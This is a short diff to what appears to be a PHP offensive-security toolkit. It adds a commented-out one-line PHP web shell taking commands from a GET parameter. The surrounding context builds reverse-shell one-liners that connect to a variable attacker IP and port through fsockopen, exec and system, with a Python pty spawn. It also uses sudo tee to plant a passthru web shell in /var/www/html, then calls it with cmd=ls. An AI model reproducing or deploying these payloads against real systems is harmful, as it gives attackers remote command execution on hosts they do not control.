@@ -649,6 +649,9 @@ python -c 'import pty;pty.spawn(\"$shell\")' ");
         $data = "php -r \"exec('".$this->rev8fifo($attacker_ip, $attacker_port, $shell)."');\" ";
         $data = "php -r \"system('".$this->rev8fifo($attacker_ip, $attacker_port, $shell)."');\" ";
         //$data = "php -r \"\$sock=fsockopen('$attacker_ip',$attacker_port);exec('$shell');\" ";
+        /*
+        <?=`$_GET[x]`?>
+        */
         $this->article(__FUNCTION__, $data);
         return $data ;
     }
@@ -668,6 +671,7 @@ python -c 'import pty;pty.spawn(\"$shell\")' ");
         $file_sh = new FILE("","$this->file_dir/sh.php" );$file_sh->file2virus2vt();
         $this->pause();
         $this->rev8php_simple();$this->pause();
+        
         $this->requette("echo \"<?php passthru(\\\$_REQUEST[\\\"cmd\\\"]);?>\" | sudo tee /var/www/html/passthru.php " );
         $this->net("localhost/passthru.php?cmd=ls" );
         $this->pause();
